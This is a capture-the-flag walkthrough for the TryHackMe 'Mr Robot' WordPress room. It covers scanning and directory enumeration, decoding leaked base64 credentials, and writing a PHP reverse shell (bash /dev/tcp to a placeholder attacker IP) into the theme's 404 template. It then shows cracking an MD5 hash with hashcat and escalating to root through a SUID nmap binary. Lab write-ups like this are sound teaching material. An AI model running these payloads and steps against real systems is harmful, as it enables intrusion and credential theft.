<div align="center">

# Mr Robot CTF

[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/WordPress-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/Hash%20Cracking-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)

</div> <br/>

## `./recon`

Port scan performed via nmap

```bash
nmap <ip> -sT -sV

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

ssh, http and https open

<br/>

## `./enum`

Ran gobuster to look for directories and files

```bash
gobuster dir -u <ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

/admin                (Status: 301)
/license              (Status: 200)
/license.txt          (Status: 200)
/readme                (Status: 200)
/robots                (Status: 200)
/robots.txt           (Status: 200)
/wp-admin             (Status: 301)
/wp-login             (Status: 200)
/wp-login.php         (Status: 200)
...
```

The site is running WordPress — visible from the paths `/wp-admin`, `/wp-login.php`, `/wp-content`

<br/>

## `./robots`

Checked robots.txt

```bash
curl <ip>/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt
```

A wordlist and the first flag inside

```bash
curl <ip>/key-1-of-3.txt
```

First flag captured!

```bash
curl <ip>/fsocity.dic
```

Saved as pass.txt for later use

<br/>

## `./credentials`

Checked license.txt

```bash
curl <ip>/license.txt

what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoded from base64 into `elliot:ER28-0652`

<br/>

## `./access`

Used the credentials to log in at `/login`, which redirects to the WordPress login form. Login succeeded, admin dashboard access obtained.

Replaced the 404 page template with a reverse shell via `Appearance → Editor`:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'");
?>
```

Opened the modified page and got a reverse shell

```bash
pwd
/opt/bitnami/apps/wordpress/htdocs

whoami
daemon
```

<br/>

## `./pivot`

Checked the home directory

```bash
ls /home

robot
ubuntu
```

Found two files in `/home/robot`

```bash
cd robot
ls

key-2-of-3.txt
password.raw-md5
```

Couldn't read the second flag directly

```bash
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

Checked the second file

```bash
cat password.raw-md5

robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5 hash for the robot user

<br/>

## `./hash-crack`

Cracked the hash with hashcat against rockyou.txt

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Password recovered

<br/>

## `./ssh`

First attempt used elliot (based on the earlier found credentials)

```bash
ssh elliot@<ip>
Permission denied, please try again.
```

Didn't work. The file found earlier used the username `robot` — tried that instead

```bash
ssh robot@<ip>
```

Logged in

```bash
ls
key-2-of-3.txt	password.raw-md5

cat key-2-of-3.txt
```

Second flag captured!

<br/>

## `./privesc`

Checked sudo

```bash
sudo -l
Sorry, user robot may not run sudo on ip-10-130-145-46.
```

sudo not directly available. Searched for SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null

/usr/local/bin/nmap
...
```

`nmap` has the SUID bit set. Used nmap's interactive mode to get an elevated shell

```bash
nmap --interactive
```

```bash
sudo -l
User root may run the following commands on ip-10-130-145-46:
    (ALL) ALL
```

<br/>

## `./root`

Located the final flag

```bash
find / -name key-3-of-3.txt 2>/dev/null

/root/key-3-of-3.txt
```

```bash
cat /root/key-3-of-3.txt
```

Third flag captured!